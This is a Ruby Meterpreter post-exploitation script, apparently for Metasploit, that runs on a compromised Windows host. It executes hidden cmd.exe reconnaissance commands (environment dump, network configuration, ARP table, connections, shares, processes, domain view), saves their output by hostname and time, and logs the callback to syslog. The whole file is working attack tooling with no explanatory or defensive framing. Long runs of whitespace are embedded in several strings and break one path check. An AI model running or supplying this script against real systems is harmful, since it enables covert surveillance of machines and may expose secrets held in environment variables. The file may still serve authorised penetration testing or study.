require 'msf/core'
require 'syslog'

def filewrt(file2wrt, data2wrt, hostname, survey_time)
        Dir.mkdir("#{hostname}") unless File.exists?("#{hostname}")
        Dir.mkdir("#{hostname}/#{survey_time}") unless File.exists?("#{hostname}                                                                                                                                                                                               /#{survey_time}")
        f = file2wrt.sub("/", "")
        f = f.sub(" ", "")
        filename = "#{hostname}/#{survey_time}/#{f}"
        output = ::File.open(filename, "a")
        data2wrt.each_line do |d|
                output.puts(d)
        end
        output.close
        return
end

def syslog_rit(message)
        Syslog.open($0, Syslog::LOG_PID | Syslog::LOG_CONS) { |s| s.info message                                                                                                                                                                                                }
end



def list_exec(session,cmdlst)
    survey_time = Time.now.strftime('%Y-%m-%d-%H%M')
    sysnfo = session.sys.config.sysinfo
    hostname = "#{sysnfo['Computer']}"
    message = "callback_time: #{survey_time}, hostname: #{hostname}"
    print_status("Running Command List ...")
    r=''
    session.response_timeout=120
    cmdlst.each do |cmd|
       begin
          print_status "running command #{cmd}"
          r = session.sys.process.execute("cmd.exe /c #{cmd}", nil, {'Hidden' =>                                                                                                                                                                                                true, 'Channelized' => true})
          while(d = r.channel.read)
             print_status("#{d}")
             filewrt(cmd, d, hostname, survey_time)
          end
          r.channel.close
          r.close
       rescue ::Exception => e
          print_error("Error Running Command #{cmd}: #{e.class} #{e}")
       end
    end
    syslog_rit(message)
 end

 commands = [ "set",
    "ipconfig  /all",
    "arp -a",
    "netstat -ano",
    "net use",
    "tasklist /v",
    "net view",
    "net view /domain"]

list_exec(client,commands)
